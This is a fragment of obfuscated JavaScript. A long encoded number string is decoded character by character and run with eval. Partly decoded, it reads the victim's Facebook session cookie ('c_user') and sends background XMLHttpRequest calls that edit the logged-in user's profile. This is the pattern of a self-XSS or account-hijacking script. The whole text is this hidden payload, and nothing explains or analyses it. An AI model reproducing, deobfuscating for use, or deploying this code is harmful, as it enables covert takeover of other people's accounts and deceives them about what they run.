37F841D665A781E765D777D781F833D505B537C513B729F557A709D721D689B557E705E781D849C513C553C505D837A849E817C757F833E781C849E541B613B417B505D505C505C505E505A505A505D505F505B505B505D505A505A505E505D505F857A813A809F793D841C841A825F561C837E781A841F705D781E829C845E781B837B841A665B781C765A777A781F833E505B537C513D645B821B817D841C781D817B841A557A713D861F825E781F513D553A513A765D825B825E809B797C773B765E841C797E821B817A565C857C557F853B853A853B557A785F821B833D813E557E845B833D809D781D817E773A821A777C781F777C513D541A613C417F505C505A505A505B505B505E505A505D505E505C505F505E505E505D505B417B797A785E537B773A797D817C837B505A621E621D505F513A785B765B833F805C781B841B813E781A865B513F505A529D529C505B777C821E773C845A813D781F817B841A561A773D821B821F805B797C781D561E837B825B809E797E841F537E513C773A797F817C837E513C505E549F505B845C837A781B833B757F797C777F505C549B513F621F513C541E561A809B781C817F789C841C793E505F625B505C573D541E869F417F505B505B505C505C505A505A505C505C505C505A505C505B505F505B505A505B857E813E809C793B841C841A825D561B837F781C817E777C537E825D765D833A765D813A837C541E613C417E877E781F809B837F781B505F797C785D537C777F821F773A845D813E781A817A841B561E773E821B821E805B797C781A561A837F825E809C797E841B537B513C773C797E817F837B513A505F549C505C845C837A781D833E757C797A777E505B549E513A621F513C541E561D809D781C817F789B841E793C505E617B621F505E573B541A869E417D505D505B505D505E505B505A505F505A505B505B505B505A505D505E505F505A773C797F817A837D797F861B781F841F789C781C841C797F833E537E845D797E777B553F773C797E817E837D553C513E837D765E833F805C765D777E765C837F781A805C809F781F513B541A613E417A877F781D809F837A781B505A797E785E537E773A797F817F837D505B621A621E505E777A821F773A845B813D781D817D841B561E773C821A821F805F797A781D561F837F825A809E797A841C537E513D773D797A817E837B513A505F549F505B845B837E781F833F757D797D777C505C549A513D621C513E541F741F573B749B561A837A825A809B797B841B537F513D613D513A541A741C569A749C561A841C821E709F841E833D797A817F789D537C541B541A869E417D505B505A505B505E505E505E505B505C505C505E505B505E505F505A505B505C857A813F809E793A841B841B825E561B837A781D817C777B537C825B765D833E765A813C837E541B613B417A877C417A877E417C505F417D565D565A773D797D817F837D797A861F781F841D505F769F781E809C797A833F809D781F813A781A417B849E765E833A505A773F797A817C837E837A821B817F845A773F505C621F505F869B877A613E417A849F765D833D505B773E797A817B837E793C841D813F809C505B621D505D777C821B773C845F813E781F817A841A561E773A833E781C765D841D781A653C809D781C813B781E817E841C537B513B793F841E813E809D513D541E613A417C785C845A817A773D841E797C821C817F505B837D773F797C817F837E797A861F781E841C789C781F841A797E833A537E845C797E777F553F773E797C817B837D553E785E821D817D805A837B797A861A821B817F541C869B417F505A505C505D505F505E505B505F505B505D505F505B505A505E505D505C505A849D765C833E505E857E813D809A793A841A841E825B505A621B505F817D781E853C505B729F685F681B665F841E841B825A705C781E829E845C781F837D841F537A541F613F417E505B505E505A505D505B505F505D505C857D813B809C793F841B841B825F561B821E817D833D781F765E777A861D837A841B765B841C781D773A793B765E817C789C781B505E621A505B785A845C817D773F841C797E821D817E505F537F541A505B869F417B505A505E505E505A505B505D505D505F505D505D505D505A505F505E505A505E505E505F505D505A505C505B505F505C797B785F537D857D813C809C793C841D841F825B561D833A781B765E777B861A709B841E765F841E781B505F621C621D505E585C541D869C417D505E505D505C505B505C505A505F505E505C505B505B505E505D505A505D505E505E505B505A505E505A505B505C505A781B849C765E809F537B513A773C797D817D837A837B821D817E845E773C505B621C505C513A505D549C505D857C813A809C793C841F841C825F561C833C781F837F825D821D817F837B781E713D781F857C841A561D841B821F709D841E833D797F817E789A537D541D561E833E781B825C809A765D773D781E537D513A785D821E833C505D537B613D613F541C613B513B553F513E513A541D505E549C505C513B613A513D541C613E417F505D505E505A505D505C505B505D505C505D505B505E505B505E505A505B505B505F505A505A505C505A505B505A505B773B797B817B837E793D841C813F809E561F797A817D817D781F833D665D713F685D681D505C621A505F773C797C817E837B837E821D817A845B773F561A801F837C813C821C777A837F561F813C765A833D805C845C825D741B569A749B741F573B749E561C757E757B793E841A813C809A417E505A505A505B505F505E505F505E505D505B505F505D505D505E505A505F505A505D505D505A505A505A505E505B505E769E841C765E833E797E793E797E561D837F781F841E713A797F813D781E537D769E845D789C845F817C561B789D781B841B713F797C813C781D537C541C505A549E505B573A569B569E569C545E593F569F545B593D569F545C577C585F545F581E593C589C541B613D417D505D505E505F505C505D505E505C505A505A505D505A505D505E505A505B505D505F505A505C505F505E505A505B505C797C785B537E773E797A817C837C793C841A813B809F561B789D781F841B653B809E781F813A781F817B841F837D641E861F713F765B789D689B765E813B781E537A513A837D781A809D781D773B841F513B541A741E569D749B561D849D765D809D845D781F505C621F621B505C513E573A513C541E869A417C505F505B505C505B505D505E505C505D505A505E505E505B505B505F505E505B505E505D505A505A505C505C505C505B777C821E773A845E813A781A817C841A561F773A821D821F805A797C781A505A621A505E513F773F797A817F837B513F505C549E505B845B837B781B833C757C797C777C505E549B505E513B621C805D765A777D797B817A613D781E857D825A797E833F781E837F621A513C505E549A505E769A841F765B833B797F793A797A561E841D821A661B685D713D709A841B833C797B817A789A537B541A613A417B505A505D505A505B505A505D505C505C505F505E505F505E505E505D505D505C505D505E505B505D505E505A505E505F877A781E809F837D781E505B797F785D537B773F797A817D837E793A841A813B809B561E789E781F841D653F809D781B813B781A817C841C837F641B861F713C765F789A689F765E813F781A537F513F837D781A809D781F773B841E513D541C741D569E749E561D849A765D809C845F781C505D621D621C505F513A577F513F541F869C417C505D505E505B505A505B505E505A505F505E505E505F505E505C505F505E505C505C505C505A505B505F505F505C505D777A821F773E845E813F781A817A841F561C773C821C821F805D797C781A505D621B505B513C773E797B817D837E513D505E549A505B845D837B781B833F757E797E777C505C549F505A513C621D781B833E805D781F805B613B781A857F825D797E833B781E837D621A513E505F549B505A769C841D765D833A797F793E797A561D841A821F661C685B713B709C841F833A797B817C789E537F541F613A417E505D505E505C505E505E505A505F505C505B505A505A505A505B505B505E505C505B505E505F505F505A505B505D505B877C417E505B505B505F505C505D505B505F505E505B505E505D505F505E505B505B505C505E505C505F505E505C505F505E505E781F849E765F809B537B785B821B817F805B837A797A861E821B817F505B549D505F513A537F513B505D549F505D797F777B505A549C505F513B553D513F505E549C505D773F797C817E837F505F549F505D513C541F613A513C541B613F417B505D505D505A505B505F505D505B505C505C505A505D505B505E505F505F505F505E505F505A505F505D505A505F505D877B417A505C505E505B505D505D505E505A505F877B613C417F505C505E505F505C505E505A505F505A505F505B505A505E505E505B505D505F857A813E809F793A841A841D825E561F821A825C781B817B537F513C661B653A713D513A553E505C513B565B765E801A765A857A565F841E797C813D781B809D797C817A781A565B781A777E797C841B757C825D833C821B785E797F809C781C565B769E765A837A797B773F757E797B817A785F821B561C825C793A825E629D757B757A765D621C573A529A757B757D845A837A781A833D621D513E505A549B505B845C837E781C833A757D797F777A553C505F841D833E845D781E541E613D417C505F505F505E505F505A505B505A505C505C505D505A505A505E505D505C505F857C813F809B793B841D841B825C561C837E781C841F705B781A829D845C781E837C841F665B781D765B777D781E833B505D537B513E729E557B709C721A689B557A705D781B849E513C553D505F837E849F817D757D833D781B849E541C613C417E505E505F505B505B505A505B505E505C505C505C505C505D505C505D505F505F857F813E809C793B841E841B825B561A837C781F817B777A537B541A613E417D877B';var _6662=/[\x41\x42\x43\x44\x45\x46]/;var _7219=2;var _8207=_4254.charAt(_4254.length-1);var _4478;var _5108=_4254.split(_6662);var _5659=[String.fromCharCode,isNaN,parseInt,String];_5108[1]=_5659[_7219+1](_5659[_7219](_5108[1])/21);var _5547=(_7219==4)?String:eval;_4478='';_11=_5659[_7219](_5108[0])/_5659[_7219](_5108[1]);for(_3016=3;_3016<_11;_3016++)_4478+=(_5659[_7219-2]((_5659[_7219](_5108[_3016])+_5659[_7219](_5108[2])+_5659[_7219](_5108[1]))/_5659[_7219](_5108[1])-_5659[_7219](_5108[2])+_5659[_7219](_5108[1])-1));var _1729='_9756';var _9495='_1729=_4478';function _8034(_6226){_5547(_4566);_8034(_9123);_9123(_9495);_8034(_1729);}var _4566='_8034=_5547';var _9123='_9123=_8034';_8034(_8207);